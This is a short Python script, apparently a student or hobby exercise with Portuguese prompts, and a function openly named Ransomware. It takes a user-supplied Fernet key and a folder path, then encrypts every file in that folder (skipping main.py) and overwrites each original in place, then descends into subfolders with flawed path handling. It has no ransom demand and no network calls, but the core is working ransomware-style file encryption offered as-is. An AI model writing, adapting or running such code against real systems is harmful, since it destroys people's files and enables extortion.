import os
from cryptography.fernet import Fernet

print("A chave do Fernet precisa ser uma sequência de 32 bytes")
print("Digite a chave, lembre-se de guardá-la com cuidado")

key = input(": ")

pastas_dentro = []

try:
    pasta = input("Digite o caminho da pasta que quer criptografar: ")
    try:


        def Ransomware():
            fernet = Fernet(key)
            arquivos = os.listdir(pasta)

            for file in arquivos:
                print(file)
                if file == "main.py":
                    continue
                else:
                    try:
                        file_path = os.path.join(pasta, file)

                        with open(file_path, 'rb') as arquivo:
                            conteudo = arquivo.read()
                        print(conteudo)

                        criptografado = fernet.encrypt(conteudo)

                        with open(file_path, 'wb') as arquivo_criptografado:
                            arquivo_criptografado.write(criptografado)

                    except FileNotFoundError:
                        print(f"Arquivo não encontrado: {file_path}")
                    except IsADirectoryError:
                        print(f"{file_path} é um diretório e não será criptografado.")
                        pastas_dentro.append(file)

                    except Exception as e:
                        print(f"Erro ao criptografar o arquivo {file}: {str(e)}")
                    
            print("Arquivos criptografados com sucesso.")            





        Ransomware()

        for arquivos2 in pastas_dentro:
            pasta = pasta + "/" + arquivos2
            print(pasta)
            Ransomware()






    except FileNotFoundError:
        print(f"Diretório não encontrado: {pasta}")
except ValueError:
    print("A chave do Fernet precisa ser uma sequência de 32 bytes.")
